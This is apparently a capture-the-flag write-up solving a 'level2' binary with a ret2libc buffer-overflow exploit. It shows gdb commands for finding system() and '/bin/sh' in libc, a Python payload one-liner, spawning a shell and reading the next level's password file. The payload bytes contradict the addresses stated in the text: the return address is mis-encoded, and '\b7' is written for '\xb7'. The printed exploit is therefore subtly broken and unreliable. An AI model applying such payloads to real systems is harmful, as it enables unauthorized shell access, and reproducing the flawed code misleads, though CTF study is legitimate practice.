## LEVEL2

For this level, we can notice that we won't be able to replace the return value with a function address because of the check condition. So we'll be using the *Ret2libc* method to exploit the binary.

> The **Ret2libc** is an exploit that replaces the return value with a function address and then the next bytes of the memory is replaced with addresses of the libc functions.

First, we'll need to find the address for *system()* and */bin/sh*. To do so, we'll be using *gdb*.\
-> `gdb level2`\
-> `(gdb) b p`\
-> `(gdb) r`\
-> `p system`\
We have the address of *system()* that is *0xb7e6b060*.\
-> `info proc map`\
From here, we'll search for */bin/sh* throughout all the libc.\
-> `find 0xb7e2c000, 0xb8000000, "/bin/sh"`\
And we also have the address of */bin/sh*, of *0xb7f8cc58*.

Finally, we'll need the address of the *return* in the function.\
-> `disas p`\
And we can see that it is *0x0804853e*.

And then, to exploit it, we'll just need to make a payload with all those informations, using an offset of 80 because the 4 bytes after the buffer size is storing *%ebp*. Following the sample of *payload = A\*80 + address of return + address of system + "DUMM" + address of /bin/sh*.\
-> `python -c 'print("A"*80 + "\xe3\x85\x04\x08" + "\x60\xb0\xe6\b7" + "DUMM" + "\x58\xcc\xf8\b7")' > /tmp/payload2`\
-> `cat /tmp/payload2 - | ./level2`


And there, we have a Shell prompt, so we can get the flag for the next level.\
-> `cd ..`\
-> `cat level3/.pass`